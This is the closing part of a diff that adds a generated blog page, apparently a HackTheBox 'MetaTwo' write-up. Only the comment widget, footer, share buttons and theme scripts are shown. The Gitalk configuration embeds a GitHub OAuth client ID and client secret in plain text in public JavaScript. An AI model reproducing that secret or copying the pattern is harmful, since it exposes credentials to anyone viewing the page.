+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/&title=《MetaTwo - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/&title=《MetaTwo - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MetaTwo - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuElEQVR42u3awW7bQAwE0Pz/T6dAb0Vre4bctVPg6RTYsqynALv0kF9f8fH9+3j+96NX8jMffTZ5d3Xg4eHhjW790fH3Oe3tPj/z+Xc9f6zP7xkPDw/vNi/ZDB5e4ilmf07ycB++joeHh/dRXru45wv9pqzHw8PD+/m8HDO7RTw8PLz/hZeEEZtANi+jk++9krXg4eHhxbxTDbB3/v2B/h4eHh5esLxuott2m0mK8vpu8fDw8C7wZjHrrOBOlvVN4Fv8YsDDw8M7xJs1rmZjBJtNqA5H8PDw8N7ISwYFNsVxu8QPh7rw8PDwLvD2QwOr5lO5nbShMx4eHt4N3qbxv4lc8+0kuX7xr8TDw8Nb8DbjTZtyfLNrJWX6H/09PDw8vKO8vGU1W77baw5/AeRZCx4eHt4hXlIKt5FuG0DkG8nmEePh4eGd5R0edToaNLTB7ovJMjw8PLwFbx/gJot1W7jn57/YbPDw8PAu8PLlOA8R8pGpFpAMLjy8Ah4eHt4h3nd5JAHE7FM3thA8PDy8e7xZ5NoGDWd3s+ifgYeHh3eZl8epM8ZsvGC25eDh4eHd5m3i0faVfDRh8/jw8PDw3sNrl+m2yE6W9fw6xS8APDw8vKO8zbK7b5i1cUbeZsPDw8N7D6/4kb9ud+WbRPKpF+/i4eHhHeW1ReosepiNbbWlfx1G4OHh4R3izdr2eXjRRiSzTeLwVAIeHh7eaANob2VTRre3i4eHh/dO3nd55IV1HhPvw4iopMbDw8M7xDu1Vcy+OGli5aNXF4tsPDw8vKABNgsgNiFC+4CKkQI8PDy8a7y8FL43bpU3vYroBA8PD++jvLwqnw0K7Mew/nEmHh4e3g/gbW66jVyTreXFNfHw8PCu8fIwou3R74vptv2Gh4eHd5vXNsBmtz5rZc3C3PrAw8PDS3m/AFhZNcrQP8TfAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
